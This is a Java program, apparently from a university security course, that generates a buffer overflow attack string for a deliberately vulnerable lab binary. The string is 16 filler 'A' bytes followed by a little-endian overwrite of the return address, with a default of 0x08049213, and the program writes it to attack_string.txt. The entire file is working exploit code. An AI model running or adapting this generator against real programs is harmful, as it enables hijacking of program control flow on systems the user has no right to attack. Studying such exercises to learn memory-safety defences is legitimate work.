import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Arrays;

/**
 * Generates a classic "smash the stack" style attack string: a filler buffer
 * followed by a target return address, written out for use against a
 * (deliberately vulnerable) sample binary in a controlled lab environment as
 * part of a computer security course assignment on buffer overflows.
 *
 * This is an educational exercise in a sandboxed course lab, not a tool for
 * attacking real systems.
 */
public class BufferOverflowAttackGenerator {

    private static final int FILLER_BYTES = 16;
    private static final byte FILLER_CHAR = 'A';

    public static void main(String[] args) {
        long targetAddress = args.length > 0 ? Long.decode(args[0]) : 0x08049213L;

        byte[] attackString = generateAttackString(targetAddress);

        try (FileOutputStream writer = new FileOutputStream("attack_string.txt", false)) {
            writer.write(attackString);
            System.out.println("Attack string generated successfully and stored in 'attack_string.txt'.");
        } catch (IOException e) {
            System.err.println("Error writing attack string to file: " + e.getMessage());
        }
    }

    private static byte[] generateAttackString(long targetAddress) {
        byte[] filler = new byte[FILLER_BYTES];
        Arrays.fill(filler, FILLER_CHAR);

        byte[] addressBytes = ByteBuffer.allocate(Long.BYTES)
                .order(ByteOrder.LITTLE_ENDIAN)
                .putLong(targetAddress)
                .array();

        byte[] attackString = new byte[filler.length + addressBytes.length];
        System.arraycopy(filler, 0, attackString, 0, filler.length);
        System.arraycopy(addressBytes, 0, attackString, filler.length, addressBytes.length);
        return attackString;
    }
}
